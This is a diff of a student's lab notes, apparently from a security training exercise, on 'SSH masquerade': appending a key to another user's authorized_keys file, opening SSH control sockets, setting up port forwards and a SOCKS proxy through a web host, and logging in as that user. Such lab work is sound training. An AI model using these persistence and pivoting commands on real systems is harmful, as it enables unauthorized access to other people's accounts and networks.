@@ -249,13 +249,21 @@ cat /home/student/.ssh/id_rsa.pub
 V9Cd4LFIUsWpbPXF1v68RJY+kE5IP84B6+aM+2gwfSULR9rpSWV+P2npvRV3zmeGCevJqT57sMfKitI6lNpYRVFF6VAl+g4LEtQ2ac1VwfYZl//FTYwpUNS24M6o0quG1L80YD88+p0XwEN+
 SDifd0Qrx5GIf+yOrEcu75EIg6KLko042f9vIb35XL5AnW5nIu9xNJZcj4OoLX3Ppht3Rja27zRg39n student@lin-ops" >> /home/billybob/.ssh/authorized_keys
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# on lin-ops
-* make a new socket, and ssh into the web server, and loggon
-- sednig private key to encrypt the begging of the conversation. This allows the client to authenticate.
- ```
- ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 1111
- ```
-* Congrats, you did a ssh  masquerade
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ssh -MS /tmp/web student@10.50.37.98
+ssh -S /tmp/web web -O forward -L127.0.0.1:2222:10.100.28.40:4444
+ssh billybob@127.0.0.1 -p 2222
+ssh -S /tmp/web web -O forward -D9050
+
+	# on lin-ops
+	* make a new socket, and ssh into the web server, and loggon
+	- sendinig private key to encrypt the begging of the conversation. This allows the client to authenticate.
+	 ```
+	 ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 1111
+	 ```
+	* Congrats, you did a ssh  masquerade
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
